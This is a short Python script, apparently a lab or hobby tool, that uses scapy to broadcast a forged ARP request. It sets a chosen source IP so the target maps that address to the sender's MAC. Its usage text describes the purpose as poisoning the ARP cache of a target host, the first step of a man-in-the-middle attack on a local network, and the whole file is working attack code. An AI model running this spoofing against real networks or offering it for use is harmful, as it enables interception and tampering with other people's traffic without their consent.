#!/usr/bin/env python3

import sys
from scapy.all import *

def main():
    if len(sys.argv) != 3:
        usage()
        sys.exit(2)
    psrc_ = sys.argv[1]
    pdst_ = sys.argv[2]
    E = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    A = ARP(psrc = psrc_, pdst = pdst_, op = 1)
    sendp(E/A, verbose=0)
    print(f'sent ARP request to {pdst_}')
    
def usage():
    print("Usage: ./arp-request.py <src-ip> <dst-ip>\
    \n\tsrc-ip: IP address of the host you want to map to your MAC address\
    \n\tdst-ip: Ip address of the host whose ARP cache you want to poison\n")
    
    
if __name__ == '__main__':
    main()
